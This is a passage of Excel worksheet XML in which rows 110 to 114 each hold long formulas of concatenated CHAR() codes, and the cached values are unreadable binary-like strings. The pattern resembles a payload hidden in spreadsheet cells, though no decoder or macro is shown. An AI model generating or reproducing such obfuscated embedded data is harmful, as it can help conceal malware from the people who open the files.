&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(87)&amp;CHAR(82)&amp;CHAR(253)&amp;CHAR(93)&amp;CHAR(102)&amp;CHAR(136)&amp;CHAR(242)&amp;CHAR(132)&amp;CHAR(254)&amp;CHAR(126)&amp;CHAR(4)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(94)&amp;CHAR(98)&amp;CHAR(54)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(70)&amp;CHAR(129)&amp;CHAR(136)&amp;CHAR(33)&amp;CHAR(139)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(40)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(13)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(121)&amp;CHAR(191)&amp;CHAR(128)&amp;CHAR(254)&amp;CHAR(126)&amp;CHAR(62)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(46)&amp;CHAR(140)&amp;CHAR(85)&amp;CHAR(45)&amp;CHAR(107)&amp;CHAR(87)&amp;CHAR(68)&amp;CHAR(129)&amp;CHAR(238)&amp;CHAR(25)&amp;CHAR(135)&amp;CHAR(114)&amp;CHAR(45)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(249)&amp;CHAR(99)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(1)&amp;CHAR(160)&amp;CHAR(108)&amp;CHAR(19)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(163)&amp;CHAR(162)&amp;CHAR(162)&amp;CHAR(137)&amp;CHAR(122)&amp;CHAR(34)&amp;CHAR(63)&amp;CHAR(92)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(150)&amp;CHAR(230)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(232)&amp;CHAR(115)&amp;CHAR(6)&amp;CHAR(87)&amp;CHAR(250)&amp;CHAR(94)&amp;CHAR(98)&amp;CHAR(130)&amp;CHAR(110)&amp;CHAR(34)&amp;CHAR(16)&amp;CHAR(231)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(105)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(152)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(25)&amp;CHAR(85)&amp;CHAR(242)&amp;CHAR(88)&amp;CHAR(121)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(85)&amp;CHAR(118)&amp;CHAR(48)&amp;CHAR(199)&amp;CHAR(74)&amp;CHAR(89)&amp;CHAR(95)</f>
        <v>y‹B,_x0010_€Ë
‚è_x0013__x0002_	Ž)_x000D__x0005__x0001_S_x0017_ŠK_x001E_QT[Œ_x000F_˜F&amp;=õWM‰ý‡ú
¼_x0003_	_x0005__x0006__x000C__x000B__x0006_4ê‡ÎrmZTk_x000B_ýPY†î€êvc†©"‰_x0002__x0006__x0008__x000C_†µ_x0001__x000E__x0001__x0013__x0002_U0ÍÊí_x000C__x0004__x000E_
_x0003__x0007_	ÀQþZwo_x0019_‹F-R^o‹A&amp;IˆM&amp;OYˆ€/†_x0004__x000B__x0006_WRý]fˆò„þ~_x0004_Vú^b6ê‰†!_x0006_	_x0002_Fˆ!‹_x0005__x0006__x0001_(„_x000D__x000D__x0003__x000D_y¿€þ~&gt;ˆC..ŒU-kWDî_x0019_‡r-VŽ_x0002_Žùc_x0002_ˆ_x0001_ l_x0013__x0003__x0004__x000B_£¢¢‰z"?\Qþ–æ_x0003__x0005__x000D_ƒès_x0006_Wú^b‚n"_x0010_ç_x000D_€i"_x0019_˜v-_x0019_UòXyPþUv0ÇJY_</v>
      </c>
      <c r="C110" t="str">
        <f>CHAR(217)&amp;CHAR(76)&amp;CHAR(216)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(220)</f>
        <v>ÙLØ¥ûÏ[ù]Ü</v>
      </c>
    </row>
    <row r="111" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B111" t="str">
        <f>CHAR(92)&amp;CHAR(82)&amp;CHAR(132)&amp;CHAR(193)&amp;CHAR(125)&amp;CHAR(193)&amp;CHAR(131)&amp;CHAR(229)&amp;CHAR(214)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(189)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(65)&amp;CHAR(197)&amp;CHAR(71)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(53)&amp;CHAR(203)&amp;CHAR(74)&amp;CHAR(125)&amp;CHAR(88)&amp;CHAR(83)&amp;CHAR(140)&amp;CHAR(171)&amp;CHAR(38)&amp;CHAR(230)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(78)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(82)&amp;CHAR(140)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(176)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(97)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(110)&amp;CHAR(128)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(38)&amp;CHAR(195)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(133)&amp;CHAR(45)&amp;CHAR(207)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(214)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(139)&amp;CHAR(129)&amp;CHAR(33)&amp;CHAR(209)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(67)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(81)&amp;CHAR(192)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(62)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(37)&amp;CHAR(198)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(1)&amp;CHAR(134)&amp;CHAR(74)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(61)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(93)&amp;CHAR(38)&amp;CHAR(193)&amp;CHAR(76)&amp;CHAR(40)&amp;CHAR(57)&amp;CHAR(7)&amp;CHAR(87)&amp;CHAR(135)&amp;CHAR(195)&amp;CHAR(212)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(69)&amp;CHAR(3)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(194)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(238)&amp;CHAR(11)&amp;CHAR(115)&amp;CHAR(198)&amp;CHAR(69)&amp;CHAR(45)&amp;CHAR(79)&amp;CHAR(241)&amp;CHAR(238)&amp;CHAR(210)&amp;CHAR(193)&amp;CHAR(206)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(69)&amp;CHAR(74)&amp;CHAR(132)&amp;CHAR(238)&amp;CHAR(77)&amp;CHAR(194)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(87)&amp;CHAR(128)&amp;CHAR(169)&amp;CHAR(32)&amp;CHAR(59)&amp;CHAR(197)&amp;CHAR(64)&amp;CHAR(47)&amp;CHAR(90)&amp;CHAR(142)&amp;CHAR(155)&amp;CHAR(38)&amp;CHAR(54)&amp;CHAR(193)&amp;CHAR(71)&amp;CHAR(46)&amp;CHAR(101)&amp;CHAR(136)&amp;CHAR(187)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(194)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(105)&amp;CHAR(142)&amp;CHAR(182)&amp;CHAR(38)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(118)&amp;CHAR(143)&amp;CHAR(238)&amp;CHAR(68)&amp;CHAR(140)&amp;CHAR(204)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(121)&amp;CHAR(220)&amp;CHAR(186)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(196)&amp;CHAR(73)&amp;CHAR(47)&amp;CHAR(113)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(74)&amp;CHAR(139)&amp;CHAR(196)&amp;CHAR(131)&amp;CHAR(46)&amp;CHAR(134)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(198)&amp;CHAR(77)&amp;CHAR(156)&amp;CHAR(22)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(73)&amp;CHAR(136)&amp;CHAR(13)&amp;CHAR(197)&amp;CHAR(135)&amp;CHAR(45)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(70)&amp;CHAR(139)</f>
        <v>\R„Á}ÁƒåÖ_x0006_	_x0002_½_x0003__x0005__x0005_AÅG-%5ËJ}XSŒ«&amp;æ_x0006__x0003_
ˆE#NŠA)RŒC&amp;^†°
_x000C__x0002__x0006_	…A/aE7n€'¥_x000B__x000D__x0005_ˆ‚&amp;Ã_x0007_
_x0006_ˆ…-Ï_x0005__x0011__x0002_‹.Ö	_x0002__x0005_‹!Ñ_x0002__x0003_	ˆC_x0005__x0004__x000B_QÀC&amp;&gt;_x001D_ˆN%ÆC&amp;7_x0001_†J!ÀF&amp;=_x0005_]&amp;ÁL(9_x0007_W‡ÃÔF-E_x0003__x000F__x000B__x000D_ÂE"F€î_x000B_sÆE-OñîÒÁÎN"EJ„îMÂM&amp;W€© ;Å@/ZŽ›&amp;6ÁG.eˆ»&amp;#ÂI"iŽ¶&amp;-ÊB-vîDŒÌA"yÜº	_x0007_ÄI/q_x0005__x0001_J‹Äƒ.†_x0001__x0001_	ÆMœ_x0016_Å.‚	_x0002__x0005__x0003_Iˆ_x000D_Å‡-_x0004__x000B__x0002__x0006_F‹</v>
      </c>
      <c r="C111" t="str">
        <f>CHAR(4)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(74)&amp;CHAR(57)&amp;CHAR(164)</f>
        <v>_x0004_ûÏ&gt;ù_J9¤</v>
      </c>
    </row>
    <row r="112" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B112" t="str">
        <f>CHAR(11)&amp;CHAR(192)&amp;CHAR(134)&amp;CHAR(42)&amp;CHAR(138)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(78)&amp;CHAR(143)&amp;CHAR(31)&amp;CHAR(194)&amp;CHAR(137)&amp;CHAR(34)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(69)&amp;CHAR(143)&amp;CHAR(149)&amp;CHAR(197)&amp;CHAR(130)&amp;CHAR(44)&amp;CHAR(152)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(34)&amp;CHAR(1)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(149)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(78)&amp;CHAR(3)&amp;CHAR(192)&amp;CHAR(192)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(157)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(77)&amp;CHAR(152)&amp;CHAR(158)&amp;CHAR(38)&amp;CHAR(206)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(169)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(196)&amp;CHAR(141)&amp;CHAR(33)&amp;CHAR(160)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(67)&amp;CHAR(7)&amp;CHAR(196)&amp;CHAR(79)&amp;CHAR(197)&amp;CHAR(138)&amp;CHAR(34)&amp;CHAR(171)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(158)&amp;CHAR(39)&amp;CHAR(21)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(183)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(197)&amp;CHAR(65)&amp;CHAR(139)&amp;CHAR(193)&amp;CHAR(140)&amp;CHAR(40)&amp;CHAR(177)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(157)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(8)&amp;CHAR(194)&amp;CHAR(135)&amp;CHAR(41)&amp;CHAR(179)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(252)&amp;CHAR(208)&amp;CHAR(205)&amp;CHAR(130)&amp;CHAR(37)&amp;CHAR(189)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(89)&amp;CHAR(139)&amp;CHAR(246)&amp;CHAR(65)&amp;CHAR(205)&amp;CHAR(130)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(189)&amp;CHAR(38)&amp;CHAR(43)&amp;CHAR(206)&amp;CHAR(129)&amp;CHAR(32)&amp;CHAR(195)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(141)&amp;CHAR(187)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(201)&amp;CHAR(130)&amp;CHAR(39)&amp;CHAR(218)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(137)&amp;CHAR(159)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(193)&amp;CHAR(129)&amp;CHAR(35)&amp;CHAR(218)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(165)&amp;CHAR(38)&amp;CHAR(54)&amp;CHAR(207)&amp;CHAR(136)&amp;CHAR(33)&amp;CHAR(235)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(146)&amp;CHAR(198)&amp;CHAR(65)&amp;CHAR(4)&amp;CHAR(196)&amp;CHAR(137)&amp;CHAR(47)&amp;CHAR(233)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(196)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(29)&amp;CHAR(115)&amp;CHAR(3)&amp;CHAR(154)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(18)&amp;CHAR(130)&amp;CHAR(186)&amp;CHAR(81)&amp;CHAR(27)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(26)&amp;CHAR(26)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(243)&amp;CHAR(139)&amp;CHAR(64)&amp;CHAR(47)&amp;CHAR(22)&amp;CHAR(52)&amp;CHAR(220)&amp;CHAR(139)&amp;CHAR(114)&amp;CHAR(34)&amp;CHAR(27)&amp;CHAR(89)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(63)&amp;CHAR(100)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(9)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(42)&amp;CHAR(137)&amp;CHAR(85)&amp;CHAR(49)&amp;CHAR(96)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(4)&amp;CHAR(12)&amp;CHAR(3)</f>
        <v>_x000B_À†*Š_x0003_
_x0001__x0001_N_x001F_Â‰"•_x0007__x0002__x0002__x0004_E•Å‚,˜_x0005__x000B__x0005_"_x0001__x0012__x0002_Î'•_x000B__x000D__x0005__x0001_N_x0003_ÀÀŽ"_x0001_	_x0007_M˜ž&amp;ÎŽ"©_x0002__x0005__x0002__x000D__x0004_	_x0002_Ä! _x000B__x0002__x0004_C_x0007_ÄOÅŠ"«
_x0001__x0001_Žž'_x0015_Ê‚!·_x0002__x0002__x0005__x000C_ÅA‹ÁŒ(±_x000B__x0005__x0006_7_x001A__x0008_Â‡)³_x000D__x0005__x0001__x0006__x0002_üÐÍ‚%½	_x0007__x0005_Y‹öAÍ‚-Â_x0005__x0002__x0005_Ž½&amp;+Î Ã_x0002__x0004__x000B_»#"É‚'Ú_x0001__x0001__x0007_‰Ÿ!5Á#Ú_x0002__x0005__x000D_¥&amp;6Ïˆ!ë_x0005__x0006__x0001_’ÆA_x0004_Ä‰/é_x0005__x0001__x0006__x0002__x0003_Ä
E%_x001D_s_x0003_š_x0002_‹M._x0012_‚ºQ_x001B__x0005__x0005__x000C__x001A__x001A_	_x0005__x0007_ó‹@/_x0016_4Ü‹r"_x001B_YþT?dˆJ	A#*‰U1`2N_x0004__x000C__x0003_</v>
      </c>
      <c r="C112" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ[ù]Ì_x0004_ûÏ</v>
      </c>
    </row>
    <row r="113" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B113" t="str">
        <f>CHAR(128)&amp;CHAR(139)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(69)&amp;CHAR(104)&amp;CHAR(73)&amp;CHAR(189)&amp;CHAR(3)&amp;CHAR(61)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(22)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(37)&amp;CHAR(41)&amp;CHAR(130)&amp;CHAR(64)&amp;CHAR(85)&amp;CHAR(18)&amp;CHAR(195)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(53)&amp;CHAR(137)&amp;CHAR(245)&amp;CHAR(135)&amp;CHAR(243)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(91)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(93)&amp;CHAR(16)&amp;CHAR(56)&amp;CHAR(198)&amp;CHAR(132)&amp;CHAR(99)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(45)&amp;CHAR(103)&amp;CHAR(60)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(141)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(22)&amp;CHAR(1)&amp;CHAR(218)&amp;CHAR(242)&amp;CHAR(117)&amp;CHAR(245)&amp;CHAR(137)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(201)&amp;CHAR(85)&amp;CHAR(128)&amp;CHAR(70)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(213)&amp;CHAR(82)&amp;CHAR(225)&amp;CHAR(164)&amp;CHAR(4)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(73)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(143)&amp;CHAR(88)&amp;CHAR(47)&amp;CHAR(5)&amp;CHAR(177)&amp;CHAR(70)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(9)&amp;CHAR(80)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(61)&amp;CHAR(193)&amp;CHAR(112)&amp;CHAR(211)&amp;CHAR(137)&amp;CHAR(169)&amp;CHAR(33)&amp;CHAR(249)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(155)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(217)&amp;CHAR(142)&amp;CHAR(94)&amp;CHAR(42)&amp;CHAR(18)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(199)&amp;CHAR(118)&amp;CHAR(107)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(82)&amp;CHAR(50)&amp;CHAR(137)&amp;CHAR(86)&amp;CHAR(29)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(11)&amp;CHAR(218)&amp;CHAR(142)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(192)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(38)&amp;CHAR(45)&amp;CHAR(140)&amp;CHAR(71)&amp;CHAR(41)&amp;CHAR(27)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(54)&amp;CHAR(140)&amp;CHAR(86)&amp;CHAR(34)&amp;CHAR(41)&amp;CHAR(138)&amp;CHAR(243)&amp;CHAR(140)&amp;CHAR(80)&amp;CHAR(37)&amp;CHAR(135)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(15)&amp;CHAR(9)&amp;CHAR(190)&amp;CHAR(195)&amp;CHAR(238)&amp;CHAR(7)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(194)&amp;CHAR(89)&amp;CHAR(86)&amp;CHAR(251)&amp;CHAR(217)&amp;CHAR(139)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(193)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(128)&amp;CHAR(202)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(204)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(137)&amp;CHAR(89)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(38)&amp;CHAR(139)&amp;CHAR(207)&amp;CHAR(17)&amp;CHAR(130)&amp;CHAR(89)&amp;CHAR(34)&amp;CHAR(21)&amp;CHAR(150)&amp;CHAR(194)&amp;CHAR(124)&amp;CHAR(153)&amp;CHAR(136)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(158)&amp;CHAR(166)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(192)&amp;CHAR(42)&amp;CHAR(70)&amp;CHAR(61)&amp;CHAR(4)&amp;CHAR(219)&amp;CHAR(34)</f>
        <v>€‹_x0007__x0006__x0001_EhI½_x0003_=_x000B__x000D_¼_x0001__x0016__x0002__x0003_WƒB%)‚@U_x0012_ÃRZõS5‰õ‡ó
[_x0001_	_x0005__x000B_¼]_x0010_8Æ„c&amp;_x001E__x0006_€É-g&lt;E_x0005_v:i#_x0016__x0001_Úòuõ‰_x0005__x000B_ÉU€Fþ_x0002_ÕRá¤_x0004__x000D__x000B_†I%_x001A_X/_x0005_±F_x0007_ŠÃ	P‹N-_x001A_=ÁpÓ‰©!ù_x0002__x0003_	Ž›‹_x0002__x0004__x000B__x0005_ÙŽ^*_x0012_ˆI_x000D_„Çvk_x0006_ËVúR2‰V_x001D_M&amp;._x000B_ÚŽ_x0008__x0006_ÀˆG&amp;-ŒG)_x001B_†_x000D_„Ïv6ŒV")ŠóŒP%‡Ëp_x000F_	¾Ãî_x0007_ˆC_x000B__x0001_ÂYVûÙ‹_x0003_ˆÁ_x0003_ŒF*_x0016_€Ê_x0005_ˆC&amp;_x0013_Ž_x0005_ƒÌr×‰Y)_x0012_‚A&amp;‹Ï_x0011_‚Y"_x0015_–Â|™ˆq/_x0011_Žž¦_x0002__x0003__x0007_À*F=_x0004_Û"</v>
      </c>
      <c r="C113" t="str">
        <f>CHAR(62)&amp;CHAR(249)&amp;CHAR(211)&amp;CHAR(88)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(177)</f>
        <v>&gt;ùÓX!¥û‡µ±</v>
      </c>
    </row>
    <row r="114" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B114" t="str">
        <f>CHAR(203)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(26)&amp;CHAR(48)&amp;CHAR(9)&amp;CHAR(113)&amp;CHAR(102)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(1)&amp;CHAR(233)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(178)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(210)&amp;CHAR(33)&amp;CHAR(11)&amp;CHAR(246)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(90)&amp;CHAR(34)&amp;CHAR(19)&amp;CHAR(108)&amp;CHAR(58)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(32)&amp;CHAR(248)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(135)&amp;CHAR(9)&amp;CHAR(59)&amp;CHAR(6)&amp;CHAR(74)&amp;CHAR(37)&amp;CHAR(15)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(14)&amp;CHAR(8)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(141)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(19)&amp;CHAR(225)&amp;CHAR(8)&amp;CHAR(185)&amp;CHAR(1)&amp;CHAR(25)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(57)&amp;CHAR(210)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(35)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(196)&amp;CHAR(7)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(198)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(38)&amp;CHAR(16)&amp;CHAR(48)&amp;CHAR(206)&amp;CHAR(114)&amp;CHAR(173)&amp;CHAR(129)&amp;CHAR(55)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(211)&amp;CHAR(116)&amp;CHAR(159)&amp;CHAR(52)&amp;CHAR(203)&amp;CHAR(136)&amp;CHAR(89)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(60)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(245)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(155)&amp;CHAR(8)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(96)&amp;CHAR(56)&amp;CHAR(25)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(220)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(74)&amp;CHAR(121)&amp;CHAR(131)&amp;CHAR(203)&amp;CHAR(12)&amp;CHAR(131)&amp;CHAR(239)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(123)&amp;CHAR(52)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(253)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(52)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(197)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(32)&amp;CHAR(23)&amp;CHAR(137)&amp;CHAR(64)&amp;CHAR(58)&amp;CHAR(38)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(51)&amp;C